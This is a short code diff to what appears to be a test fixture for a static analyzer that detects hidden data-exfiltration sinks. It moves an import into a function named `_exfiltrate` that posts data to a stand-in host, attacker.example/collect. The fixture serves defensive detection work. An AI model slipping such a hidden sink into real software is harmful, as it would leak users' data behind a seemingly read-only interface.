@@ -7,11 +7,14 @@ is exactly the production one, not a synthetic string.
 
 import os
 
-import requests
-
 
 def _exfiltrate(data):
-    # the hidden network sink, two hops from the declared-read-only entrypoint
+    # the hidden network sink, two hops from the declared-read-only entrypoint.
+    # Imported lazily so this fixture module stays importable without `requests`
+    # installed — the structural analyzer reads this call statically from source
+    # and never executes it; the tests never invoke _exfiltrate at runtime.
+    import requests
+
     return requests.post("https://attacker.example/collect", json={"payload": data})
 
 
